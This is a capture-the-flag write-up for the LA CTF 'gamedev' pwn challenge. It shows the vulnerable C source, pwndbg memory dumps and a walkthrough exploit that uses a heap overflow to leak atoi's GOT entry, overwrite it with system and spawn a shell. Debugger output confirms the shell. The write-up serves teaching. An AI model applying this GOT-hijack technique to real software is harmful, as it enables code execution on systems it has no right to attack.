# gamedev
pwn/gamedev
bliutech
108 solves / 331 points

You've heard of rogue-likes, but have you heard of heap-likes?

`nc chall.lac.tf 31338`

## Vulnerability
Here's the source code:
```c
#include <stdio.h>
#include <stdlib.h>

struct Level *start = NULL;
struct Level *prev = NULL;
struct Level *curr = NULL;

struct Level
{
    struct Level *next[8];
    char data[0x20];
};

int get_num()
{
    char buf[0x10];
    fgets(buf, 0x10, stdin);
    return atoi(buf);
}

// create new note at a specified index (0-7)
// allocates memory for the new level 

void create_level()
{
if (prev == curr) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }

    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }
    
    struct Level *level = malloc(sizeof(struct Level)); // Allocates memory for the new level
    if (level == NULL) {
        puts("Failed to allocate level.");
        return;
    }

    level->data[0] = '\0';
    for (int i = 0; i < 8; i++)
        level->next[i] = NULL;

    prev = level; // Updates prev pointer to the new level

    if (start == NULL)
        start = level;
    else
        curr->next[idx] = level; // links it to the current level using the index 
}

// edits data of current level (curr) 
// bof 
void edit_level()
{
// do not allow editing start/previous level 
    if (start == NULL || curr == NULL) {
        puts("No level to edit.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Enter level data: ");
    

    fgets(curr->data, 0x40, stdin); // bof, prime candidate to become system 
}

// Displays the data of current level
void test_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to test.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Level data: ");
    write(1, curr->data, sizeof(curr->data));
    putchar('\n');
}

// Navigates through the level structure
void explore()
{
    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }

    if (curr == NULL) {
        puts("No level to explore.");
        return;
    }
    
    // Moves curr pointer to a different level using index
    curr = curr->next[idx];
}

void reset()
{
    curr = start;
}

void menu()
{
    puts("==================");
    puts("1. Create level");
    puts("2. Edit level");
    puts("3. Test level");
    puts("4. Explore");
    puts("5. Reset");
    puts("6. Exit");

    int choice;
    printf("Choice: ");
    choice = get_num();

    if (choice < 1 || choice > 6)
        return;
    
    switch (choice)
    {
        case 1:
            create_level();
            break;
        case 2:
            edit_level();
            break;
        case 3:
            test_level();
            break;
        case 4:
            explore();
            break;
        case 5:
            reset();
            break;
        case 6:
            exit(0);
    }
}

void init()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    // Add starting level
    start = malloc(sizeof(struct Level));
    start->data[0] = '\0';
    for (int i = 0; i < 8; i++)
        start->next[i] = NULL;
    curr = start;
}

int main()
{
    init();
    puts("Welcome to the heap-like game engine!");
    printf("A welcome gift: %p\n", main);
    while (1)
        menu();
    return 0;
}
```
From the above source code, we can spot a buffer overflow vulnerability in the `edit_level` function:
```c
void edit_level()
{
// do not allow editing start/previous level 
    if (start == NULL || curr == NULL) {
        puts("No level to edit.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Enter level data: ");
    

    fgets(curr->data, 0x40, stdin); // bof, prime candidate to become system 
}
```
This function contains `fgets(curr->data, 0x40, stdin);` that allows us to write 0x40 bytes to `curr->data` while `curr->data` can only hold 0x20 bytes.
```c
struct Level
{
    struct Level *next[8];
    char data[0x20];
};
```
Here's the memory structure of each `Level` heap chunk:

- very first 10 bytes is always the metadata and size
```
pwndbg> tele 0x55e764327290
00:0000│  0x55e764327290 ◂— 0
01:0008│  0x55e764327298 ◂— 0x71 /* 'q' */

pwndbg> x/32gx 0x55e764327290
0x55e764327290: 0x0000000000000000      0x0000000000000071
```
- Then the next `0x8 * 8 = 0x40` bytes of each chunk stores the pointers of chunks (levels) created within the chunk. What I mean by within here, is that when `curr` points to the chunk. 
```
from 0xa0 to 0xd0 it stores the pointers to chunk created within the current chunk, after we "explore(x)" into it

0x55e764327290: 0x0000000000000000      0x0000000000000071
0x55e7643272a0: 0x000055e764327310      0x000055e764327380
0x55e7643272b0: 0x000055e7643273f0      0x0000000000000000
0x55e7643272c0: 0x0000000000000000      0x0000000000000000
0x55e7643272d0: 0x0000000000000000      0x0000000000000000

```
- The last 0x20 bytes is the data
```
0x55e764327350: 0x4242424242424242      0x4242424242424242
0x55e764327360: 0x4242424242424242      0x4242424242424242
0x55e764327370: 0x0000000000000000      0x0000000000000071
0x55e764327380: 0x000055e74872cff8      0x000000000000000a

here 0x71 is the size of the next chunk
```
From the above example chunk, we can see that the buffer of data starts from `0x55e764327350`. 0x40 bytes of buffer allows us to overflowing up to the first two pointers of the next chunk:
```
0x55e764327380: 0x000055e74872cff8      0x000000000000000a
```
## Solution 
From the above vulnerability analysis, we now should have a clear idea of how the overflow works. Therefore, we should know that we can easily put arbitrary addresses onto the as the first two pointers of a `level`.   

Before I bring up my exploit plan, let's take a look at three more functions:
1. `explore()`
```c
void explore()
{
    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }

    if (curr == NULL) {
        puts("No level to explore.");
        return;
    }
    
    // Moves curr pointer to a different level using index
    curr = curr->next[idx];
}
```
The explore() function moves to arbitrary `levels` created within the current level, the current chunk we located at. For example:
```
0x55e764327290: 0x0000000000000000      0x0000000000000071
0x55e7643272a0: 0x000055e764327310      0x000055e764327380
```
when `curr` points to `0x55e7643272a0` i.e. the first `level` initialized being our current `level`. `explore(0)` would take us to `curr->next[0]` i.e. the first address that the `level` points to, which is `0x000055e764327310`
```
0x55e764327300: 0x0000000000000000      0x0000000000000071
0x55e764327310: 0x0000000000000000      0x0000000000000000
```
Now whatever we do would happen on this `level`, this chunk. For example, the address `create_level(0)` called after we are in this chunk, would be put on the address `0x55e764327310`. That's how `explore()` work, we move to address that the address of `curr` stores, or pointing to. 
2. test_level()
```c
void test_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to test.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Level data: ");
    write(1, curr->data, sizeof(curr->data));
    putchar('\n');
}
```
This just prints the data stored in the current `level`. For instance, if `curr` points to `0x55e764327310`:
```
0x55e764327300: 0x0000000000000000      0x0000000000000071
0x55e764327310: 0x0000000000000000      0x0000000000000000
0x55e764327320: 0x0000000000000000      0x0000000000000000
0x55e764327330: 0x0000000000000000      0x0000000000000000
0x55e764327340: 0x0000000000000000      0x0000000000000000
0x55e764327350: 0x4242424242424242      0x4242424242424242
0x55e764327360: 0x4242424242424242      0x4242424242424242
```
a bunch of `'B's` would be the output. So basically, it outputs stuff starting from address `curr+0x40`:
```
   0x55c57300e3f9 <test_level+120>    mov    rax, qword ptr [rip + 0x2c90]     RAX, [curr] => 0x7ff113995070
   0x55c57300e400 <test_level+127>    add    rax, 0x40                         RAX => 0x55c573011038 (atoi@got[plt]) (0x55c573010ff8 + 0x40)                                                                                          
 ► 0x55c57300e404 <test_level+131>    mov    edx, 0x20                         EDX => 0x20
   0x55c57300e409 <test_level+136>    mov    rsi, rax                          RSI => 0x55c573011038 (atoi@got[plt]) —▸ 0x7ff1137d74a0 (atoi) ◂— sub rsp, 8                                                                           
   0x55c57300e40c <test_level+139>    mov    edi, 1                            EDI => 1
   0x55c57300e411 <test_level+144>    mov    eax, 0                            EAX => 0
   0x55c57300e416 <test_level+149>    call   write@plt                   <write@plt>
```
See? There's a `add    rax, 0x40` right after loading `curr` into `rax`.
3. reset()
```c
void reset()
{
    curr = start;
}
```
This is a very useful function that resets the `curr` pointer to point back to `start`, the starting level, the very very first chunk created. Because it is possible to go very deep with `explore()` 

### libc address leak 
Now let's talk about the attack plan, the first thing to mention is how to leak the libc address. Why? Because from the checksec:
```
pwndbg> checksec
File:     /home/kali/Downloads/gamedev/chall_patched
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
Stripped:   No
```
it says `Partial RELRO` which might implies that this is a GOT hijacking challenge, where we could hijack our prime candidate `atoi(buf);` to `system` as the `buf` can be easily passed as `/bin/sh` via our input with fgets in:
```
int get_num()
{
    char buf[0x10];
    fgets(buf, 0x10, stdin);
    return atoi(buf);
}
```
Before we go deep into talking about leaking, let's talk about what we have in hand:
- `.text` address leak
```c
    puts("Welcome to the heap-like game engine!");
    printf("A welcome gift: %p\n", main);
```
yes we got a gift. This can be used to calculate the runtime `@plt` address of `atoi` and leaks it. 
```
0x55c573011038] atoi@GLIBC_2.2.5 -> 0x7ff1137d74a0 (atoi) ◂— sub rsp, 8

Dump of assembler code for function main:
   0x000055c57300e662 <+0>:     push   rbp

pwndbg> x/x 0x55c573011038 - 0x000055c57300e662
0x29d6: Cannot access memory at address 0x29d6
```
Therefore, runtime `atoi@plt` would always be `main_addr + 0x29d6`.

#### leaking 
Here's a step by step guide on how to leak arbitrary addresses:
```py
create_level(0)  
create_level(1) 
create_level(2) 

explore(1)
create_level(0)
reset()
```
First, create three `levels` and we go into the second `level`. The reason why we need a third level is because of:
```
if (prev == curr) {
	puts("We encourage game creativity so try to mix it up!");
        return;
}
```
Due to `prev = level;` in `create_level`, `prev` points to the the lastest `level` created within a `level`. ANd after a simple `explore(1)` in the above specific example, we moves from `curr` to the second chunk. Therefore, if we do not create another third chunk, `prev = curr` would happen. 

Anyways, after successfully moving to the second chunk and that `prev != curr`, we can create a `level` inside the second chunk (`level`). Lastly, we `reset` back to the starting chunk, so that we can move into the first chunk to overflow into the first pointer of the second chunk we have just created. Here's how it looks like:
```py
explore(0) # going into the first chunk to overflow into the second chunk
payload1 = flat(
	
	b"B" * 0x20, # padding 
	0, # metadata
	0x0000000000000071, # size
	atoi_addr - 0x40 # Address to leak, as it loads like this - lea    rcx, [rdx + 0x40]
)
edit_level(payload1) # writes the above payload from first level overflowing up to the second
reset()
```
After the above process, 
```
pwndbg> tele 0x55a07741c370
00:0000│  0x55a07741c370 ◂— 0
01:0008│  0x55a07741c378 ◂— 0x71 /* 'q' */
02:0010│  0x55a07741c380 —▸ 0x55a037846ff8 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7f22091a8070 ◂— push rbx
```
`0x55a07741c380` which is the first pointer of the second chunk, now points to `atoi-0x40`  

Moving on, now it's time to move `curr` to become the address of `atoi-0x40` and then we calls `test_level()` to print `curr + 0x40`, which is `atoi - 0x40 + 0x40`, which is the `plt` address of `atoi` !!
```py
explore(1) # now curr points to the second chunk 
explore(0) # now curr points to atoi - 0x40
test_level() # leaks curr+0x40 now!
```
Output:
```
Level data: \xa0\xa4\xe8\xc8\xd9\x7f\x00\x00\xb6\x100\x08\xd3U\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P@0\x08\xd3U\x00\x00
```
And of course we parse it with python! And calculate the address of `system` so that we can overwrite `atoi` to it later.
```py
leak = p.recvuntil(b'\x7f', drop = False)[-6:].ljust(8, b'\x00')
leak = u64(leak)
#print(hex(printf_addr))
sys_addr = leak - libc.sym['atoi'] + libc.sym['system']
```
Be reminded that now `curr` still points to `atoi-0x40`. We can call `edit_level()` directly to write stuff to `curr + 0x40`(data section of chunk), which is `atoi - 0x40 + 0x40` at this moment, which would write `atoi` into `system`
```
[0x55b455771038] atoi@GLIBC_2.2.5 -> 0x55b45576e0a6 (atoi@plt+6) ◂— push 7
```
to 
```
[0x55b455771038] atoi@GLIBC_2.2.5 -> 0x7f1a5c1b7490 (system) ◂— test rdi, rdi
```
And right after `atoi` is called:
```
► 0x55b45576e1e0 <get_num+39>        call   atoi@plt                    <atoi@plt>
        nptr: 0x7fff2ae1e010 ◂— 0x68732f6e69622f /* '/bin/sh' */
``` 
WE GET THE SHELL!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```
pwndbg> ni
[Attaching after process 961807 vfork to child process 962407]
[New inferior 2 (process 962407)]
warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
[Detaching vfork parent process 961807 after child exec]
[Inferior 1 (process 961807) detached]
process 962407 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 3: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "edit_level" in current context.
Error in re-setting breakpoint 2: No symbol "test_level" in current context.
Error in re-setting breakpoint 3: No symbol "get_num" in current context.
Error in re-setting breakpoint 1: No symbol "edit_level" in current context.
Error in re-setting breakpoint 2: No symbol "test_level" in current context.
Error in re-setting breakpoint 3: No symbol "get_num" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "edit_level" in current context.
Error in re-setting breakpoint 2: No symbol "test_level" in current context.
Error in re-setting breakpoint 3: No symbol "get_num" in current context.
[Attaching after Thread 0x7fb4c9fed740 (LWP 962407) vfork to child process 962416]
[New inferior 3 (process 962416)]
Error in re-setting breakpoint 1: No symbol "edit_level" in current context.
Error in re-setting breakpoint 2: No symbol "test_level" in current context.
Error in re-setting breakpoint 3: No symbol "get_num" in current context.
Error in re-setting breakpoint 1: No symbol "edit_level" in current context.
Error in re-setting breakpoint 2: No symbol "test_level" in current context.
Error in re-setting breakpoint 3: No symbol "get_num" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "edit_level" in current context.
Error in re-setting breakpoint 2: No symbol "test_level" in current context.
Error in re-setting breakpoint 3: No symbol "get_num" in current context.
[Detaching vfork parent process 962407 after child exec]
[Inferior 2 (process 962407) detached]
process 962416 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 3: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "edit_level" in current context.
Error in re-setting breakpoint 2: No symbol "test_level" in current context.
Error in re-setting breakpoint 3: No symbol "get_num" in current context.
Error in re-setting breakpoint 1: No symbol "edit_level" in current context.
Error in re-setting breakpoint 2: No symbol "test_level" in current context.
Error in re-setting breakpoint 3: No symbol "get_num" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "edit_level" in current context.
Error in re-setting breakpoint 2: No symbol "test_level" in current context.
Error in re-setting breakpoint 3: No symbol "get_num" in current context.
```
       
